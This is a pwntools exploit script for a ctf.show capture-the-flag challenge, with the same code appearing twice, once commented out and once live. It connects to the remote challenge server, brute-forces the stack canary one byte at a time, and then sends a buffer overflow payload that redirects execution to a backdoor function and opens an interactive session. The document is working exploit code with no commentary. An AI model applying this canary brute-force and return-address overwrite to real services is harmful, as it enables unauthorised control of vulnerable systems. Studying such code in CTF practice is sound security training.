'''from pwn import *
context(log_level='debug',arch='i386', os='linux')
#context(log_level='debug',arch='amd64', os='linux')
p=remote("pwn.challenge.ctf.show",28186)

backdoor=0x8048636

canary = b'\x00'

for i in range(3):
    for j in range(0, 256):
        payload=b'a' * (0x70 - 0xC) + canary + p8(j)
        p.send(payload)
        time.sleep(0.1)
        text=p.recv()
        if (b"stack smashing detected" not in text):
            canary+=p8(j)
            print(b"Canary:" + canary)
            break
print('Canary:'+ hex(u32(canary)))
payload = b'a' * (0x70 - 0xc) + canary + b'a' * 0xc + p32(backdoor)
p.send(payload)
p.recv()
p.interactive()'''
from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28186)
elf = ELF('./pwn')
backdoor = 0x08048636
 
canary = b'\x00'
for i in range(3):
  for j in range(0, 256):
      payload = b'a' * (0x70 - 0xC) + canary + p8(j)
      io.send(payload)
      sleep(0.3)
      text = io.recv()
      print(text)
      if (b"stack smashing detected" not in text):
          canary += p8(j)
          print(b"Canary: " + canary)
          break
print('Canary:'+ hex(u32(canary)))
payload = b'a' * (0x70 - 0xC) + canary + b'a' * 0xc + p32(backdoor)
io.send(payload)
io.recv()
io.interactive()